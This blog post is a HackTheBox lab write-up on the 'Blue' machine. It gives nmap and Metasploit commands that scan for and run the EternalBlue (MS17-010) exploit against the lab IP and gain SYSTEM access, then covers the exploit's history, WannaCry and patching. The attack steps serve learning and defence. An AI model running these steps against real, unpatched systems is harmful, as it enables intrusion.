---
layout: post
title: 'HackTheBox - Blue'
date: 2018-01-19
author: Casey Mullineaux
cover: '/images/htb/blue/blue.png'
tags: hackthebox
---
Rated by the community as *a piece of cake*, this machine is probably one of the easiest boxes to complete on the [HackTheBox.eu](http://www.hackthebox.eu), but that doesn't mean that it doens't offer learning opportunities (see post-mortem).

![blue-difficulty](/images/htb/blue/blue-difficulty.png)

I was able to achieve system access by using the `EternalBlue` ([MS17-010](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010)) exploit via Metasploit.

# Hacking the box
1. [Enumeration](#enum)
2. [Exploitation](#exploit)
3. [Privilege escalation](#privesc)
4. [Deconstructing the hack](#deconstruct)

# <a name="enum"></a>Enumeration

The name of the box itself implies this box has something to do with the [very publicised](https://www.wired.co.uk/article/what-is-eternal-blue-exploit-vulnerability-patch) EternalBlue exploit.

The vulnerability works by exploiting SMB, so I first ran an nmap scan and saw that port 445 (SMB) is open.

```bash
nmap -sC -sV -oA nmap/blue 10.10.10.40
```
![image1](/images/htb/blue/nmap-blue.png)

Going on my hunch, I used metasploit to explicitly scan for the EternalBlue vulnerability.
```bash
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 10.10.10.40
exploit
```
![image2](/images/htb/blue/msf_eternalblue.png)

The results show that it's vunerable to EternalBlue.

# <a name="exploit"></a>Exploitation

I fired up the exploit module, and after setting the options, I triggered the exploit.
```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOST 10.10.10.40
exploit
```
![image3](/images/htb/blue/eternalblue_exploit.png)

Easy win.

# <a name="privesc"></a>Privilege Escalation

None required. The exploit dumps us in directly as the `NT AUTHORITY\SYSTEM` user.

# <a name="deconstruct"></a>Deconstructing the hack

Although this box was easy to pop with the simplicity of Metasploit doing all the work, I found it very interesting to read up on EternalBlue exploit.

## Background

The exploit it self was derived from a tool created by the NSA of the same name, and is one of many tools that make up the NSA hacking framework called FuzzBunch (much like their own version of Metasploit). On April 14 2017, a hacking group known as [The Shadow Brokers](https://en.wikipedia.org/wiki/The_Shadow_Brokers) leaked the tool to the public as part of their fifth leak in a series, this one titled "Lost in Translation".

The exploit itself utilizes three separate vulnerabilities/bugs in the SMB1.0 protocol, to achieve remote code execution on the victim host. All versions of Windows prior to Windows 8 are effected.

## Weaponization

No more than a month after the vulnerabilty was made public, it was weaponized in the very popular [WannaCry Randomware Attack](https://en.wikipedia.org/wiki/WannaCry_ransomware_attack) that made its way throughout the internet in May 2017. WannaCry encrypts the infected host's system and demands ransom payments of bitcoin for the decryption keys. A victim failing to make payment before the timer expires would see their precious cat pictures forever encrypted.

![Wana_Decrypt0r_screenshot](/images/htb/blue/Wana_Decrypt0r_screenshot.png)

## Mitigation

Microsoft have released patches for the vulnerabilities under the [MS17-010](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010) security bulletin.

[This Microsoft support article](https://support.microsoft.com/en-us/help/2696547/how-to-detect-enable-and-disable-smbv1-smbv2-and-smbv3-in-windows-and) demonstrates various methods to detect and mitigate the issue by disabling SMB on Windows systems such as; using powershell, modifying the registry, and using Group Policy.

